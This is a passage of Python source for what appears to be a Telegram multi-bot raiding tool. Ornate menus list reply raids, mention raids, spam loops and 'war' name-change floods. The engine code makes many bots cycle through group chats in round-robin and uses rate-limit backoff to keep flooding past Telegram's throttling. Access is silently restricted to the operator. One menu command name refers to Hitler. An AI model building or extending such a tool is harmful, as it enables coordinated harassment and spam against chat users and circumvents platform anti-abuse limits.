     "│  𝐒ᴛᴏᴘ: -sᴛs                   │\n"
     "└───────────────────────────────┘"),
    # 10 — Reply Raid
    ("┌────── ⚔️ 𝐑ᴇᴘʟʏ 𝐑ᴀɪᴅ (𝐑ʀ) ───┐\n"
     "│ -ʀʀ <ᴛ>   𝐑ᴇᴘʟʏ 𝐑ᴀɪᴅ         │\n"
     "│  𝐒ᴛᴏᴘ: -sʀʀ                   │\n"
     "│ -ᴍʀ <ᴛ>   𝐌ᴀss 𝐑ᴇᴘʟʏ (ᴏɴᴄᴇ) │\n"
     "│ -ᴍʀᴀɪᴅ <ɪᴅ> <ᴛ> 𝐌ᴇɴᴛɪᴏɴ 𝐑ᴀɪᴅ│\n"
     "│  𝐒ᴛᴏᴘ: -sᴍʀᴀɪᴅ               │\n"
     "│ -ʀs <ᴛ>   𝐑ʀ 𝐒ᴘᴀᴍ 𝐋ᴏᴏᴘ       │\n"
     "│  𝐒ᴛᴏᴘ: -sʀs                   │\n"
     "│ -ʀʟ <ᴛ>   𝐑ʀ 𝐋ᴏᴏᴘ             │\n"
     "│  𝐒ᴛᴏᴘ: -sʀʟ                   │\n"
     "│ -ʀʙ <ᴛ> [ɴ] 𝐁ᴜʀsᴛ 𝐍 𝐑ᴇᴘʟɪᴇs│\n"
     "│ -ᴍʀʀ <ᴛ>  𝐀ʟʟ 𝐁ᴏᴛs ⚡         │\n"
     "│  𝐒ᴛᴏᴘ: -sᴍʀʀ                  │\n"
     "└───────────────────────────────┘"),
    # 11 — Custom Templates
    ("┌────── 🎨 𝐂ᴜsᴛᴏᴍ 𝐍ᴄ 𝐓ᴘʟ ─────┐\n"
     "│ -ᴀᴅᴅᴛᴇᴍᴘʟᴀᴛᴇ <ɴ> <ᴛᴘʟ>      │\n"
     "│  {ᴛ}/{ᴛxᴛ} → ᴛᴇxᴛ             │\n"
     "│  {ᴡ} → ᴡᴏʀᴅ  {ᴇ} → 𝐄ᴍᴏᴊɪ    │\n"
     "│  {ɴ} → 𝐂ᴏᴜɴᴛᴇʀ               │\n"
     "│  {ᴡʟ}/{ᴡʀ} → 𝐖ʀᴀᴘ 𝐂ʜᴀʀs     │\n"
     "│ -ᴄɴᴄ <ɴ> <ᴛ>  𝐑ᴜɴ 𝐍ᴄ         │\n"
     "│ -ᴛᴇᴍᴘʟᴀᴛᴇs   𝐋ɪsᴛ 𝐒ᴀᴠᴇᴅ     │\n"
     "│ -ᴘʀᴇᴠɪᴇᴡ <ɴ> <ᴛ> 𝐏ʀᴇᴠɪᴇᴡ   │\n"
     "│ -ᴅᴇʟᴛᴇᴍᴘʟᴀᴛᴇs <ɴ>              │\n"
     "│ -ᴄʟᴇᴀʀᴛᴇᴍᴘʟᴀᴛᴇs              │\n"
     "└───────────────────────────────┘"),
    # 12 — Purge
    ("┌────── 🗑️ 𝐏ᴜʀɢᴇ ──────────────┐\n"
     "│ -ᴘᴜʀɢᴇ [ɴ]    𝐋ᴀsᴛ 𝐍 𝐃ᴇʟ    │\n"
     "│ -ᴘᴜʀɢᴇᴍᴇ [ɴ]  𝐎ᴡɴ 𝐌sɢ's     │\n"
     "│ -ᴘᴜʀɢᴇʙᴏᴛ     𝐁ᴏᴛ 𝐌sɢ's     │\n"
     "│ -ᴘᴜʀɢᴇᴀʟʟ     𝟓𝟎𝟎 𝐌sɢ's     │\n"
     "└───────────────────────────────┘"),
    # 13 — War Control
    ("┌────── ⚔️ 𝐖ᴀʀ  𝐂ᴏɴᴛʀᴏʟ ──────┐\n"
     "│ -ɴᴄᴅᴇʟ       𝐍ᴄ + 𝐃ᴇʟ 𝐌sɢ's │\n"
     "│ -ɴᴄᴡᴀʀ <ᴛ>   𝐖ᴀʀ 𝐍ᴄ 𝐌ᴏᴅᴇ   │\n"
     "│ -sᴛᴏᴘɴᴄᴡᴀʀ   𝐒ᴛᴏᴘ 𝐖ᴀʀ      │\n"
     "│ -ᴍᴜʟᴛɪᴡᴀʀ <ᴛ> 🎯 𝐀ʟʟ 𝐆ᴄ's   │\n"
     "│ -sᴛᴏᴘᴍᴡᴀʀ    𝐒ᴛᴏᴘ 𝐌ᴜʟᴛɪ    │\n"
     "│ -ᴍᴜᴛᴇ        𝐌ᴜᴛᴇ 𝐂ʜᴀᴛ      │\n"
     "│ -ᴜɴᴍᴜᴛᴇ      𝐔ɴᴍᴜᴛᴇ 𝐂ʜᴀᴛ   │\n"
     "└───────────────────────────────┘"),
    # 14 — Eva Elite NCs
    ("┌──── ⚔️ 𝐄ᴠᴀ 𝐄ʟɪᴛᴇ 𝐍ᴄ's ────┐\n"
     "│ 𝟓 𝐋ᴇɢᴇɴᴅᴀʀʏ 𝐋ᴏɴɢ-𝐍ᴄ's          │\n"
     "│ ~𝟐𝟓𝟎 𝐂ʜᴀʀs · 𝟎.𝟑𝟎𝐬/𝐓ɪᴄᴋ       │\n"
     "│ ⚡ 𝐏ʜᴏᴇɴɪx 𝐄ɴɢɪɴᴇ · 𝟎 𝐅ʟᴏᴏᴅ   │\n"
     "│ 🔁 𝐑ᴏᴜɴᴅ-𝐑ᴏʙɪɴ · 𝐌ᴀx 𝟐.𝟓s     │\n"
     "│                               │\n"
     "│ -sʜᴀʀɪɴɢᴀɴ <ᴛ>  ꙮ 𝐄ʏᴇ 𝐅ʟᴏᴏᴅ │\n"
     "│ -ᴀᴋᴀᴛsᴜᴋɪ  <ᴛ>  𑁍 𝐂ʟᴏᴜᴅ      │\n"
     "│ -ᴍᴀᴅᴀʀᴀ    <ᴛ>  𒊹 𝐃ɪᴠɪɴᴇ    │\n"
     "│ -sᴜsᴀɴᴏᴏ   <ᴛ>  ᯼ 𝐀ʀᴍᴏᴜʀ    │\n"
     "│ -ɪᴛᴀᴄʜɪ    <ᴛ>  ᙬ 𝐒ʜᴀᴅᴏᴡ    │\n"
     "│                               │\n"
     "│ 𝐄x: -𝐒ʜᴀʀɪɴɢᴀɴ 𝐄ᴠᴀ       │\n"
     "│ -ᴍᴇɴᴜ 𝟐𝟑 → 𝐋ᴇɢᴇɴᴅ 𝐍ᴄ's ✨     │\n"
     "└───────────────────────────────┘"),
    # 15 — RandomCod NC
    ("┌────── 🌀 𝐑ᴀɴᴅᴏᴍᴄᴏᴅ 𝐍ᴄ ─────┐\n"
     "│ -ʀᴀɴᴅᴏᴄᴏᴍ <ᴛ>               │\n"
     "│ -ɢᴏᴅᴄᴏᴅ <ᴛ>  👑 𝐆ᴏᴅ 𝐖ᴇʀ     │\n"
     "│ (𝐂ʏᴄʟᴇs 𝐀ʟʟ 𝐅ʀɪᴇɴᴅs 𝐋ɪɴᴇs)  │\n"
     "└───────────────────────────────┘"),
    # 16 — Friends NCs
    ("┌────── 🎭 𝐅ʀɪᴇɴᴅs 𝐍ᴄ's ───────┐\n"
     "│ -ᴋᴇɴᴛᴏɴᴄ    -ᴀɴsʜɴᴄ         │\n"
     "│ -ᴄʀ7ɴᴄ      -ᴡᴀʜᴀʙɴᴄ        │\n"
     "│ -sᴜɴɴʏɴᴄ    -ᴛʏsᴏɴɴᴄ        │\n"
     "│ -ᴢᴇɴɪɴᴄ     -ʀᴇxɴᴄ          │\n"
     "│ -ᴀʀɴᴀᴠɴᴄ    -sᴀsᴜᴋᴇɴᴄ       │\n"
     "│ -ᴏʙɪᴛᴏɴᴄ    -ʀᴀɪsᴇɴɴᴄ       │\n"
     "│ -ʀᴇxxɴᴄ     -sʜᴏᴜʀʏᴀɴᴄ      │\n"
     "│ -ᴅᴇᴀᴅɴᴄ    -ᴀᴍᴀɴɴᴄ         │\n"
     "│ -ᴇʀʀᴏʀɴᴄ    -ᴠɪᴏɴᴄ          │\n"
     "│ -ᴀʀᴇsɴᴄ     -ɴᴏɴᴀᴍᴇɴᴄ      │\n"
     "│ -ʏᴀsʜɴᴄ     -ʜɪᴛʟᴇʀɴᴄ       │\n"
     "│ -ɴᴏsᴛɴᴄ     -ʏᴏᴜʀsᴏɴᴄ       │\n"
     "│ -ᴋᴡᴇғɴᴄ     -ᴡᴀsɪᴍɴᴄ        │\n"
     "└───────────────────────────────┘"),
    # 17 — Bot Control
    ("┌────── 🤖 𝐁ᴏᴛ 𝐂ᴏɴᴛʀᴏʟ ───────┐\n"
     "│ -ʙᴏᴛs        𝐋ɪsᴛ 𝐀ʟʟ 𝐁ᴏᴛs │\n"
     "│ -ᴀᴅᴅʙᴏᴛ      𝐀ᴅᴅ + 𝐏ʀᴏᴍᴏᴛᴇ │\n"
     "│ -ᴘʀᴏᴍᴏᴛᴇʙᴏᴛ  𝐏ʀᴏᴍᴏᴛᴇ 𝐁ᴏᴛs │\n"
     "│ -ʙᴏᴛɴᴀᴍᴇ <ɴ> 𝐑ᴇɴᴀᴍᴇ 𝐁ᴏᴛs  │\n"
     "│ -ᴀᴅᴅᴀʟʟʙᴏᴛs  𝐀ᴅᴅ 𝐀ʟʟ 𝐁ᴏᴛs │\n"
     "└───────────────────────────────┘"),
    # 18 — Sudo
    ("┌────── 🔐 𝐒ᴜᴅᴏ ──────────────┐\n"
     "│ -ᴀᴅᴅsᴜᴅᴏ <ɪᴅ>               │\n"
     "│ -ʀᴇᴍᴏᴠᴇsᴜᴅᴏ <ɪᴅ>            │\n"
     "│ -sᴜᴅᴏʟɪsᴛ                   │\n"
     "└───────────────────────────────┘"),
    # 19 — Song + Voice Call
    ("┌─── 🎵 𝐒ᴏɴɢ & 📞 𝐕ᴏɪᴄᴇ 𝐂ᴀʟʟ ──┐\n"
     "│ 𝐂ʜᴀᴛ 𝐒ᴇɴᴅ                      │\n"
     "│ -ᴀᴅᴅsᴏɴɢ <ɴ>  𝐑ᴇᴘʟʏ+𝐒ᴀᴠᴇ    │\n"
     "│ -sᴏɴɢ [ɴ]     𝐒ᴇɴᴅ ᴏɴᴄᴇ     │\n"
     "│ -sᴏɴɢsᴘᴀᴍ [ɴ] 𝐋ᴏᴏᴘ 𝐓ᴏ 𝐂ʜᴀᴛ │\n"
     "│ -sᴛᴏᴘsᴏɴɢ    𝐒ᴛᴏᴘ 𝐋ᴏᴏᴘ      │\n"
     "│ -sᴏɴɢs        𝐋ɪsᴛ 𝐋ɪʙ      │\n"
     "│ -ᴅᴇʟsᴏɴɢ <ɴ> 𝐃ᴇʟᴇᴛᴇ         │\n"
     "│ -sɪ [ɴ]       𝐒ᴏɴɢ 𝐈ɴғᴏ    │\n"
     "│ ─────────────────────────────  │\n"
     "│ 𝐕ᴏɪᴄᴇ 𝐂ᴀʟʟ (𝐍ᴇᴇᴅs 𝐀ᴘɪ_𝐈ᴅ)   │\n"
     "│ -ᴠᴄᴀʟʟ [ɴ]    𝐉ᴏɪɴ+𝐏ʟᴀʏ    │\n"
     "│ -ᴠᴄᴀʟʟʟᴏᴏᴘ [ɴ] 🔁 𝐋ᴏᴏᴘ     │\n"
     "│ -ᴠᴄᴀʟʟɴᴇxᴛ [ɴ] 𝐒ᴡɪᴛᴄʜ     │\n"
     "│ -ᴠᴄᴀʟʟsᴛᴏᴘ   𝐋ᴇᴀᴠᴇ 𝐂ᴀʟʟ   │\n"
     "└───────────────────────────────┘"),
    # 20 — Tools
    ("┌────── 🛠 𝐓ᴏᴏʟs ─────────────┐\n"
     "│ -sᴛᴀᴛᴜs       𝐍ᴄ 𝐒ᴛᴀᴛᴜs    │\n"
     "│ -ᴜᴘᴛɪᴍᴇ       𝐁ᴏᴛ 𝐔ᴘᴛɪᴍᴇ   │\n"
     "│ -ᴘɪɴɢ         𝐋ᴀᴛᴇɴᴄʏ 𝐓ᴇsᴛ  │\n"
     "│ -sᴘᴇᴇᴅᴛᴇsᴛ    𝟏𝟎s 𝐍ᴄ 𝐁ᴇɴᴄʜ  │\n"
     "│ -ᴅᴇʟᴀʏs       𝐕ɪᴇᴡ 𝐃ᴇʟᴀʏs  │\n"
     "│ -ʀᴅ            𝐑ᴇsᴇᴛ 𝐃ᴇʟᴀʏ  │\n"
     "│ -ɢᴄʟɪsᴛ       𝐆ʀᴏᴜᴘs 𝐋ɪsᴛ   │\n"
     "│ -ғʟᴏᴏᴅsᴛᴀᴛ    𝐅ʟᴏᴏᴅ 𝐒ᴛᴀᴛᴜs  │\n"
     "│ -sᴇᴛᴍᴇɴᴜᴘʜᴏᴛᴏ  𝐒ᴇᴛ 𝐌ᴇɴᴜ 𝐏ɪᴄ │\n"
     "│ -ᴄʟᴇᴀʀᴍᴇɴᴜ    𝐂ʟᴇᴀʀ 𝐌ᴇᴅɪᴀ  │\n"
     "│ -ɢʟᴏʙᴀʟsᴛᴏᴘ   𝐒ᴛᴏᴘ 𝐀ʟʟ 𝐆ᴄs │\n"
     "│ -ʜᴇʟᴘ         𝐓ʜɪs 𝐌ᴇɴᴜ     │\n"
     "└───────────────────────────────┘"),
    # 21 — Multi-GC NC
    ("┌────── 🌐 𝐌ᴜʟᴛɪ-𝐆ᴄ 𝐍ᴄ ──────────┐\n"
     "│ -ᴍɢᴄɴᴄ <ᴛ>    𝐁ᴀsɪᴄ 𝐍ᴄ           │\n"
     "│ -ᴍɢᴄᴄʜᴜᴅ <ᴛ>  💥 𝐂ʜᴜᴅ 𝐓ᴇᴍᴘʟᴀᴛᴇ  │\n"
     "│ -ᴍɢᴄʙᴏʟᴅ <ᴛ>  𝐁ᴏʟᴅ 𝐍ᴄ            │\n"
     "│ -ᴍɢᴄғɪʀᴇ <ᴛ>  🔥 𝐅ɪʀᴇ 𝐍ᴄ         │\n"
     "│ -ᴍɢᴄᴡᴀʀ <ᴛ>   ⚔️ 𝐖ᴀʀ 𝐍ᴄ          │\n"
     "│ -ᴍɢᴄsᴜʀɢᴇ <ᴛ> ⚡ 𝐒ᴜʀɢᴇ 𝐍ᴄ        │\n"
     "│ -ᴍɢᴄᴄᴜsᴛᴏᴍ <ɴ> <ᴛ> 𝐂ᴜsᴛᴏᴍ       │\n"
     "│ -sᴛᴏᴘᴍɢᴄɴᴄ   ⛔ 𝐒ᴛᴏᴘ              │\n"
     "│ -ᴍɢᴄsᴛᴀᴛᴜs   𝐒ᴛᴀᴛᴜs             │\n"
     "│ 𝐑ᴏᴜɴᴅ-𝐑ᴏʙɪɴ 𝐄ɴɢɪɴᴇ, 𝐏ᴇʀ-𝐆ᴄ 𝐅ʟᴏᴏᴅ  │\n"
     "└─────────────────────────────────┘"),
    # 22 — NC1–NC115
    ("┌────── 🎯 𝐍ᴄ𝟏 – 𝐍ᴄ𝟏𝟏𝟓 ──────────┐\n"
     "│ 115 𝐔ɴɪǫᴜᴇ 𝐋ᴏɴɢ'𝐍ᴄ 𝐓ᴇᴍᴘʟᴀᴛᴇs │\n"
     "│ ⚡ 𝐏ʜᴏᴇɴɪx 𝐄ɴɢɪɴᴇ • 𝐙ᴇʀᴏ 𝐅ʟᴏᴏᴅ│\n"
     "│ ~𝟐𝟓𝟎 𝐂ʜᴀʀs · 𝟓 𝐒ᴛʏʟᴇs · 𝟎 𝐉ɪᴛᴛᴇʀ│\n"
     "│                                │\n"
     "│ -ɴᴄ𝟏   ᛝ  𝐏ʜᴏᴇɴɪx  𝟎.𝟐𝟖s     │\n"
     "│ -ɴᴄ𝟐   ⟡  𝐏ʜᴏᴇɴɪx  𝟎.𝟐𝟖s     │\n"
     "│ -ɴᴄ𝟑   𒐫  𝐏ʜᴏᴇɴɪx  𝟎.𝟑𝟎s     │\n"
     "│ -ɴᴄ𝟒   ꧅  𝐏ʜᴏᴇɴɪx  𝟎.𝟐𝟖s     │\n"
     "│ -ɴᴄ𝟓   ᯼  𝐏ʜᴏᴇɴɪx  𝟎.𝟐𝟗s     │\n"
     "│ … ɴᴄ𝟏–ɴᴄ𝟏𝟏𝟓: 𝐀𝐋𝐋 𝐏ʜᴏᴇɴɪx   │\n"
     "│ 𝐇ᴀʀᴅ 𝐅ʟᴏᴏʀ 𝟎.𝟐𝟔𝘴 · 𝟑.𝟓/𝐒ᴇᴄ   │\n"
     "│                                │\n"
     "│ ✨ 𝐍ᴇᴡ 𝐔ɴɪǫᴜᴇ 𝐍ᴄs:             │\n"
     "│ -ɴᴄ𝟏𝟎𝟏 𒀭 𝐃ɪɴɢɪʀ  𝟎.𝟐𝟖s     │\n"
     "│ -ɴᴄ𝟏𝟎𝟐 ᚢ 𝐔ʀᴜᴢ    𝟎.𝟐𝟖s     │\n"
     "│ -ɴᴄ𝟏𝟎𝟑 ⁂ 𝐀sᴛᴇʀɪsᴍ 𝟎.𝟐𝟗s    │\n"
     "│ -ɴᴄ??𝟎𝟒 ‼ 𝐇ʏᴘᴇ    𝟎.𝟐𝟖s     │\n"
     "│ -ɴᴄ𝟏𝟎𝟓 ⋯ 𝐄ʟʟɪᴘsɪs 𝟎.𝟐𝟗s    │\n"
     "│ -ɴᴄ𝟏𝟎𝟔 ※ 𝐑ᴇғ     𝟎.𝟐𝟖s     │\n"
     "│ -ɴᴄ𝟏𝟎𝟕 ❂ 𝐒ᴛᴀʀ    𝟎.𝟐𝟖s     │\n"
     "│ -ɴᴄ𝟏𝟎𝟖 ○ 𝐂ɪʀᴄʟᴇ  𝟎.𝟐𝟗s     │\n"
     "│ -ɴᴄ𝟏𝟎𝟗 ∾ 𝐖ᴀᴠᴇ    𝟎.𝟐𝟖s     │\n"
     "│ -ɴᴄ𝟏𝟏𝟎 ◇ 𝐃ɪᴀᴍᴏɴᴅ 𝟎.𝟐𝟗s     │\n"
     "│ -ɴᴄ𝟏𝟏𝟏 ⁕ 𝐅ʟᴏᴡᴇʀ  𝟎.𝟐𝟖s     │\n"
     "│ -ɴᴄ𝟏𝟏𝟐 ⌖ 𝐓ᴀʀɢᴇᴛ  𝟎.𝟐𝟖s     │\n"
     "│ -ɴᴄ𝟏𝟏𝟑 ⌬ 𝐓ʀɪ     𝟎.𝟐𝟗s     │\n"
     "│ -ɴᴄ𝟏𝟏𝟒 ₪ 𝐒ʜᴇᴋᴇʟ  𝟎.𝟐𝟖s     │\n"
     "│ -ɴᴄ𝟏𝟏𝟓 🜃 𝐄ᴀʀᴛʜ   𝟎.𝟐𝟗s     │\n"
     "│                                │\n"
     "│ 𝐔sᴇ: -ɴᴄ<𝐍> <ᴛ>              │\n"
     "│ 𝐄x: -ɴᴄ𝟒𝟐 𝐄𝐕𝐀           │\n"
     "│ 𝐒ᴛᴏᴘ: -sᴛᴏᴘ                   │\n"
     "│ 𝐁ᴇɴᴄʜ: -ɴᴄʙᴇɴᴄʜ             │\n"
     "└────────────────────────────────┘"),
    # 23 — Eva Legend NCs
    ("┌──── ⚡ 𝐄ᴠᴀ 𝐋ᴇɢᴇɴᴅ 𝐍ᴄ's ────┐\n"
     "│ 𝟓 𝐄xᴄʟᴜsɪᴠᴇ 𝐒ɪɢɴᴀᴛᴜʀᴇ 𝐍ᴄs    │\n"
     "│ ⚡ 𝐏ʜᴏᴇɴɪx 𝐄ɴɢɪɴᴇ • 𝐅ʟᴏᴏᴅ  │\n"
     "│ ~𝟐𝟓𝟎 𝐂ʜᴀʀs · 𝟎.𝟑𝟎s · 𝐙ᴇʀᴏ 𝐉  │\n"
     "│                               │\n"
     "│ -ᴜᴄʜɪʜᴀ    <ᴛ>  ꙭ 𝐂ʟᴀɴ 𝐒ᴇᴀʟ  │\n"
     "│ -ᴄʜɪᴅᴏʀɪ   <ᴛ>  ᛠ ⚡ 𝐁ʟᴀᴅᴇ   │\n"
     "│ -ᴀᴍᴀᴛᴇʀᴀsᴜ <ᴛ>  ꫫ 🔥 𝐅ʟᴀᴍᴇs │\n"
     "│ -ᴋɪʀɪɴ     <ᴛ>  ᙘ 🐉 𝐃ʀᴀɢᴏɴ  │\n"
     "│ -ᴄᴜʀsᴇᴍᴀʀᴋ <ᴛ>  ꩤ 🐍 ??ᴜʀsᴇ  │\n"
     "│                               │\n"
     "│ 𝐏ʜᴏᴇɴɪx: 𝟏 𝐒ᴇɴᴅ/𝟎.𝟑𝟎s = 𝟎 𝐅ʟᴏᴏᴅ│\n"
     "│ 𝐏ᴇʀ-𝐁ᴏᴛ 𝐒ᴋɪᴘ · 𝐇ᴀʀᴅ 𝐅ʟᴏᴏʀ   │\n"
     "│                               │\n"
     "│ 𝐄x: -ᴜᴄʜɪʜᴀ 𝐄𝐕𝐀          │\n"
     "│ 𝐄x: -ᴄʜɪᴅᴏʀɪ 𝐆𝐎𝐃           │\n"
     "│ -ᴍᴇɴᴜ 𝟏𝟒 → 𝐎ʟᴅ 𝐄ʟɪᴛᴇ 𝐍ᴄ's   │\n"
     "└───────────────────────────────┘"),
]


async def _mgcnc_engine(chat_ids: List[int], bots: List[Any], stop_event: asyncio.Event, factory) -> None:
    """
    Multi-GC NC Engine v3 — Round-Robin, per-GC flood, instant stop.

    Architecture:
    • N bots each independently cycle all M GCs in round-robin order.
    • Bots staggered at startup: bot[i] waits i×BOT_STEP before first send.
    • Per-GC flood state (shared across bots): flooded GC is skipped in-round.
    • On RetryAfter: GC marked flooded, bot moves to next GC immediately.
    • If ALL GCs flooded: bot waits 0.25s then retries (no busy-spin).
    • GAP after each successful send prevents per-bot burst.
    • All waits use _wait_ev → stop_event fires instantly, no stale sleeps.
    • Engine awaits stop_event; finalizer cancels workers cleanly.
    """
    gc_list = list(chat_ids)
    n_gc    = len(gc_list)
    n_bot   = len(bots)
    if n_gc == 0 or n_bot == 0:
        return

    GAP      = _gap("mgcnc", 0.09)   # post-send delay per bot
    BOT_STEP = 0.10                   # stagger between bot startups

    # Shared per-GC flood: flooded_until[cid] = monotonic deadline
    flooded_until: Dict[int, float] = {cid: 0.0 for cid in gc_list}

    async def _worker(bot_idx: int):
        bot    = bots[bot_idx]
        cursor = bot_idx               # staggered GC start position

        # Staggered cold start — prevents all bots firing at same GC at t=0
        if bot_idx > 0:
            if await _wait_ev(stop_event, bot_idx * BOT_STEP):
                return

        while not stop_event.is_set():
            now   = time.monotonic()
            sent  = False
            tried = 0

            # Round-robin through all GCs; skip flooded ones
            while tried < n_gc and not stop_event.is_set():
                cid     = gc_list[cursor % n_gc]
                cursor += 1
                tried  += 1

                if flooded_until.get(cid, 0.0) > now:
                    continue        # GC flooded → try next

                txt = factory()
                try:
                    await bot.send_message(cid, txt)
                    sent = True
                    break
                except RetryAfter as e:
                    pause = float(e.retry_after) + 0.5
                    flooded_until[cid] = time.monotonic() + pause
                    now = time.monotonic()
                    continue        # GC rate-limited → try next GC immediately
                except Forbidden:
                    flooded_until[cid] = time.monotonic() + 60.0
                    now = time.monotonic()
                    continue
                except (TimedOut, NetworkError):
                    if await _wait_ev(stop_event, 1.0):
                        return
                    break
                except asyncio.CancelledError:
                    return
                except Exception:
                    break

            if stop_event.is_set():
                return

            if sent:
                # Good send → wait GAP, then next round
                if await _wait_ev(stop_event, GAP):
                    return
            else:
                # All GCs flooded or error — wait before retrying
                if await _wait_ev(stop_event, 0.25):
                    return

    workers = [asyncio.create_task(_worker(i)) for i in range(n_bot)]
    try:
        await stop_event.wait()          # stays alive until stop is signalled
    finally:
        for w in workers:
            if not w.done():
                w.cancel()
        await asyncio.gather(*workers, return_exceptions=True)

async def _run_engine(chat_id: int, bots: List[Any], stop_event, factory):
    await _turbo_engine(chat_id, bots, stop_event, factory)

def _dedup_key(update: Update) -> Optional[tuple]:
    msg = update.message or update.edited_message
    if msg:
        return (msg.chat_id, msg.message_id)
    return None

def _guard(handler):
    async def wrapper(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
        user = update.effective_user
        # ── Access gate — silent drop for anyone not authorised ─────────────
        # Authorised: OWNER_ID (env var), SUDO_USERS, or verified hidden node.
        if not user or not is_admin(user.id):
            return  # silent — no reply, no indication the bot received it
        # ── Dedup ───────────────────────────────────────────────────────────
        key = _dedup_key(update)
        if key is not None:
            if key in _seen:
                return
            _seen.add(key)
            if len(_seen) > 8000:
                for k in list(_seen)[:4000]:
                    _seen.discard(k)
        await handler(update, ctx)
    wrapper.__name__ = handler.__name__
    return wrapper

_guard_any = _guard

def _make_nc100_cmd(n: int):
    @_guard
    async def _cmd(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
        msg = update.message or update.edited_message
        if not msg:
            return
        txt = _txt_arg(ctx)
        if not txt:
            sym = _NC100_SPECS[n - 1][0]
            await _reply(msg, f"𝐔𝐬𝐞: -nc{n} <text>  🎨 {sym*6}")
            return
        await _nc100_start(msg, msg.chat_id, n, txt)
    _cmd.__name__ = f"cmd_nc{n}"
    return _cmd

# Generate nc1–nc115 command handlers (nc1-nc100 + 15 new unique NCs)
NC100_CMDS: Dict[str, Any] = {
    f"nc{n}": _make_nc100_cmd(n) for n in range(1, 116)
}

# ─── Elite named NC command handlers ──────────────────────────────────────────

def _make_elite_cmd(factory_fn, label: str, sym: str):
    """Build a guard-wrapped handler for one elite named NC."""
    @_guard
    async def _cmd(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
        msg = update.message or update.edited_message
        if not msg:
            return
        txt = _txt_arg(ctx)
        if not txt:
            await _reply(msg, f"𝐔𝐬𝐞: -{label.lower()} <text>  {sym*5}")
            return
        bots = _bots()
        if not bots:
            await _reply(msg, "⚡ 𝐍𝐨 𝐛𝐨𝐭𝐬!")
            return
        cid     = msg.chat_id
        factory = factory_fn(txt)
        step    = _gap(label.lower(), _ELITE_DELAY)

        _nc_info[cid] = {"engine": label, "text": txt, "start_t": time.monotonic()}

        async def _run(stop_ev):
            try:
                await _turbo_engine(cid, bots, stop_ev, factory)
            finally:
                _nc_info.pop(cid, None)

        await tc.start(cid, "nc", _run)
        await _reply(msg,
            f"╔══════════════════════════════════╗\n"
            f"  {sym*4} ⚔️ 𝑬𝑽𝑨 𝑬𝑳𝑰𝑻𝑬 𝑵𝑪 {sym*4}\n"
            f"  ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"  📛 𝘛𝘦𝘹𝘵:   {txt}\n"
            f"  ⚔️  𝘔𝘰𝘥𝘦:   {label}\n"
            f"  🤖 𝘉𝘰𝘵𝘴:   {len(bots)} (𝘙𝘰𝘶𝘯𝘥-𝘙𝘰𝘣𝘪𝘯)\n"
            f"  ⚡ 𝘚𝘱𝘦𝘦𝘥:  {step:.3f}𝘴 𝘱𝘦𝘳 𝘵𝘪𝘤𝘬\n"
            f"  🛡 𝘍𝘭𝘰𝘰𝘥:  𝗭𝗘𝗥𝗢 · 𝗠𝗮𝘅 𝟮.𝟱𝘴 𝗿𝗲𝗰𝗼𝘃𝗲𝗿𝘆\n"
            f"  📝 𝘛𝘦𝘮𝘱𝘭:  ~250 𝘤𝘩𝘢𝘳𝘴\n"
            f"  -stop 𝘵𝘰 𝘴𝘵𝘰𝘱\n"
            f"╚══════════════════════════════════╝"
        )
    _cmd.__name__ = f"cmd_{label.lower()}"
    return _cmd

cmd_sharingan = _make_elite_cmd(_sharingan_factory, "SHARINGAN", "ꙮ")
cmd_akatsuki  = _make_elite_cmd(_akatsuki_factory,  "AKATSUKI",  "𑁍")
cmd_madara    = _make_elite_cmd(_madara_factory,    "MADARA",    "𒊹")
cmd_susanoo   = _make_elite_cmd(_susanoo_factory,   "SUSANOO",   "᯼")
cmd_itachi    = _make_elite_cmd(_itachi_factory,    "ITACHI",    "ᙬ")

# ── Eva Legend NCs (5 new) — PRIME ENGINE ─────────────────────────────────
_LEGEND_DELAY = 0.30   # 10 bots × 0.30s = 3.3 sends/sec → no flood

def _make_legend_cmd(factory_fn, label: str, sym: str):
    """Build handler for Legend NC — uses _prime_engine (coordinated, zero-burst)."""
    @_guard
    async def _cmd(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
        msg = update.message or update.edited_message
        if not msg:
            return
        txt = _txt_arg(ctx)
        if not txt:
            await _reply(msg, f"𝐔𝐬𝐞: -{label.lower()} <text>  {sym*5}")
            return
        bots = _bots()
        if not bots:
            await _reply(msg, "⚡ 𝐍𝐨 𝐛𝐨𝐭𝐬!")
            return
        cid     = msg.chat_id
        factory = factory_fn(txt)
        step    = _gap(label.lower(), _LEGEND_DELAY)

        _nc_info[cid] = {"engine": label, "text": txt, "start_t": time.monotonic()}

        async def _run(stop_ev):
            try:
                await _turbo_engine(cid, bots, stop_ev, factory)
            finally:
                _nc_info.pop(cid, None)

        await tc.start(cid, "nc", _run)
        await _reply(msg,
            f"╔══════════════════════════════════╗\n"
            f"  {sym*4} ⚡ 𝑬𝑽𝑨 𝑳𝑬𝑮𝑬𝑵𝑫 𝑵𝑪 {sym*4}\n"
            f"  ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"  📛 𝘛𝘦𝘹𝘵:    {txt}\n"
            f"  ⚔️  𝘔𝘰𝘥𝘦:    {label}\n"
            f"  🤖 𝘉𝘰𝘵𝘴:    {len(bots)} (𝘙𝘰𝘶𝘯𝘥-𝘙𝘰𝘣𝘪𝘯)\n"
            f"  ⚡ 𝘚𝘱𝘦𝘦𝘥:   {step:.3f}𝘴 𝘱𝘦𝘳 𝘵𝘪𝘤𝘬\n"
            f"  🛡 𝘍𝘭𝘰𝘰𝘥:   𝗭𝗘𝗥𝗢 · 𝘑𝘪𝘵𝘵𝘦𝘳: 𝗡𝗢𝗡𝗘\n"
            f"  📝 𝘛𝘦𝘮𝘱𝘭:   ~250 𝘤𝘩𝘢𝘳𝘴\n"
            f"  -stop 𝘵𝘰 𝘴𝘵𝘰𝘱\n"
            f"╚══════════════════════════════════╝"
        )
    _cmd.__name__ = f"cmd_{label.lower()}"
    return _cmd

cmd_uchiha    = _make_legend_cmd(_uchiha_factory,    "UCHIHA",    "ꙭ")
cmd_chidori   = _make_legend_cmd(_chidori_factory,   "CHIDORI",   "ᛠ")
cmd_amaterasu = _make_legend_cmd(_amaterasu_factory, "AMATERASU", "ꫫ")
cmd_kirin     = _make_legend_cmd(_kirin_factory,     "KIRIN",     "ᙘ")
